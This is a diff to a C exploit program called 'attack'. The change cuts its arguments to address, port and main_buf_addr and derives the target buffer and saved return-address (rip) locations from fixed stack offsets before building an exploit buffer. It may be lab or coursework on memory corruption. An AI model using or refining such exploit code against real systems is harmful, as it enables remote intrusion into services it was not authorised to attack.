@@ -227,8 +227,8 @@ int main (int argc, char** argv)
 {
 	status_t status = success ();
 
-	if (argc != 6) {
-		fprintf (stderr, "Usage: %s address port main_buf_addr foo_buf_addr rip_addr\n", argc == 0 ? "attack" : argv [0]);
+	if (argc != 4) {
+		fprintf (stderr, "Usage: %s address port main_buf_addr\n", argc == 0 ? "attack" : argv [0]);
 		return EXIT_FAILURE;
 	}
 
@@ -239,19 +239,8 @@ int main (int argc, char** argv)
 		return EXIT_FAILURE;
 	}
 
-	uint64_t foo_buf_addr = 0;
-	status = parse_address (&foo_buf_addr, argv [4]);
-	if (failed (status)) {
-		fprintf (stderr, "%s: %s\n", status.reason, argv [4]);
-		return EXIT_FAILURE;
-	}
-
-	uint64_t rip_addr = 0;
-	status = parse_address (&rip_addr, argv [5]);
-	if (failed (status)) {
-		fprintf (stderr, "%s: %s\n", status.reason, argv [5]);
-		return EXIT_FAILURE;
-	}
+	uint64_t foo_buf_addr = main_buf_addr - 0x30;
+	uint64_t rip_addr = main_buf_addr - 0x18;
 
 	char* exploit = NULL;
 	size_t exploit_size = 0;
